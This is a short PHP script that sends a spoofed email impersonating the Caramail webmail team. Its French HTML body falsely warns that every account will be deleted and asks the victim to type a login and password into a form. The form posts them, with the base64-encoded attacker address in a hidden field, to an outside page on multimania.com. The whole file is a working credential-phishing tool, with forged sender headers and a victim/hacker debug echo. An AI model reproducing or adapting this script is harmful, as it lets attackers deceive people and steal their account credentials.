<?php
$victime.="@caramail.com";
$tmp=base64_encode($hacker);
$headers.="From: admin@caramail.com\n";
$headers.="Mime-Version: 1.0\n";
$headers.="Content-Type: text/html\n";
$text.="
<center><img src=\"http://imgsrv.caramail.com/images/caramail.gif\"><br><font face=arial>
Comme vous le savez peut-�tre, nous avons<br>
depuis quelques semaines des probl�mes de type DOS-B5<br>
sur notre serveur. La totalit� des comptes va disparaitre.<br><br>
Pour eviter cela, veuillez remplir le formulaire ci-dessous<br>
afin de r�actualiser vos donn�es aupr�s du serveur.<br></center>

Merci de votre compr�hension.<br>
Cordialement.<br>
&nbsp;&nbsp;&nbsp;&nbsp;L'�quipe Caramail<br>

<form method=\"POST\" action=\"http://www.multimania.com/lotfree2/confirm.php\">
Login :
<input type=\"text\" name=\"login\">
Mot de passe :
<input type=\"password\" name=\"pass\">
<input type=\"hidden\" name=\"TZ\" value=\"$tmp\">
<input type=\"submit\" value=\"Envoyer\">
</form>"; 

mail("$victime","Identification","$text","$headers");
echo "victime = $victime - hacker = $hacker - tmp = $tmp";
?>


















